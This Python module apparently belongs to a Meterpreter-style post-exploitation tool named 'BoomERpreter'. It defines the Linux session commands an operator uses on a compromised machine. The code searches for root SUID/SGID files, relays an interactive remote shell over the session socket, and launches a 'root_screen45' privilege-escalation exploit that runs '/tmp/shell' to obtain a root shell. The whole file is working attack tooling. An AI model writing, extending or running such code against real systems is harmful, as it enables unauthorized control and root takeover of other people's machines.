import extra_functions.custom_print as custom_print

class Linux:
    def __init__(self, s_obj, current_session):
        self.current_session = current_session
        self.obj_session = s_obj
        self.meterpreter_functions = {
                        "help": {
                            "function":"help",
                            "help":"Show this help.",
                            "commmand": "help",
                            "exec": False},
                        "background": {
                            "function":"background",
                            "help":"Send Session to background",
                            "commmand": "background",
                            "exec": False},
                        "exit": {
                            "function":"exit",
                            "help":"Close BoomERpreter",
                            "commmand": "exit",
                            "exec": True},
                        "suid_sgid": {
                            "function": "check_result",
                            "help": "Find root SUID_SGID files",
                            "commmand":"suid_sgid <path>", 
                            "exec": True},
                        "shell": {
                            "function": "shell",
                            "help": "Spawn a Shell",
                            "commmand":"shell", 
                            "exec": True},
                        "root_screen45": {
                            "function": "root_screen45",
                            "help": "Try to get a root shell",
                            "commmand":"root_screen45", 
                            "exec": True}
                    }

    def get_functions(self):
        return self.meterpreter_functions
    
    def check_result(self, result):
        print(result)
    
    def help(self):
        for k,v in self.meterpreter_functions.items():
            print(k + ": " + v["help"])
            print("   |_ Execute: " + v["commmand"])
    
    def shell(self, result):
        if "No" == result:
            custom_print.info("No shell obtained")
            return
        print(result, end=" ")
        while True:
            data_input = input()
            self.current_session.send((data_input+"\n").encode())
            if "exit" in data_input:
                return
            recv = self.current_session.recv(1024)
            if recv:
                print(recv.decode(), end=" ")
    
    def root_screen45(self, result):
        if result == "ok":
            res = input("The exploit is ready. Launch it?(y/n): ")
            if res.lower() == "y":
                self.obj_session.send_msg(self.current_session, ["shell", "/tmp/shell"])
                data = self.current_session.recv(4096)
                data = data.decode()
                self.shell(data)
            else:
                custom_print.info("Aborted")